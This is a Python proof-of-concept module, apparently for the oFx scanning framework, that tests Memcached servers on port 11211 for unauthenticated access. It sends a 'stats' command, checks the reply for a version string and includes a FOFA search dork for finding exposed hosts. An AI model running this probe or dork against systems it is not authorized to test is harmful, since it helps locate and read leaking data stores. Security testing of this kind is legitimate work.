# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import socket
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "MemCache未授权访问",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "MemCache",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            memcache未授权访问漏洞，默认的 11211 端口不需要密码即可访问，攻击者可获取数据库中信息，造成严重的信息泄露。
            
            除memcached中数据可被直接读取泄漏和恶意修改外，由于memcached中的数据像正常网站用户访问提交变量一样会被后端代码处理，
            当处理代码存在缺陷时会再次导致不同类型的安全问题。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            port="11211"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        ip = self.host
        port = self.port if self.port != None else 11211
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            socket.setdefaulttimeout(10)
            soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            soc.connect((ip,int(port)))
            soc.send(('stats\r\n').encode())
            result = soc.recv(1024).decode()
            if "STAT version" in result:
                vuln = [True,result]
            else:
                vuln = [False,result]
            soc.close()
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()